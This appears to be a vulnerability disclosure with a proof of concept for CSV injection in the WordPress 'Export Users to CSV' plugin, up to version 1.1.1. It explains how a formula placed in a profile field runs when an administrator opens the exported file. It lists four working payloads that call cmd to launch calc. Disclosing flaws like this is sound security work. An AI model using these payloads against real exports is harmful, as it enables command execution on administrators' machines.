# 1. Plugin Description:
# WordPress Export Users to CSV plugin exports user data and meta data.
# You can even export the users by role and registration date range.

# 2. Technical Description:
# WordPress Export users to CSV plugin version 1.1.1. and before are affected by Remote Code Execution
# through the CSV injection vulnerability. This allows an application user to inject commands as part
# of the fields of his profile and these commands are executed when a user with greater privilege
# exports the data in CSV and opens that file on his machine.

# 3. Proof Of Concept (PoC):
# Enter the payload =SUM(1+1)*cmd|' /C calc'!A0 in any field of the profile, for example, in biography.
# When the user with high privileges logs in to the application, export data in CSV and opens the
# generated file, the command is executed and the calculator will run open on the machine.

# 4. Payloads:
=SUM(1+1)*cmd|' /C calc'!A0
+SUM(1+1)*cmd|' /C calc'!A0
-SUM(1+1)*cmd|' /C calc'!A0
@SUM(1+1)*cmd|' /C calc'!A0
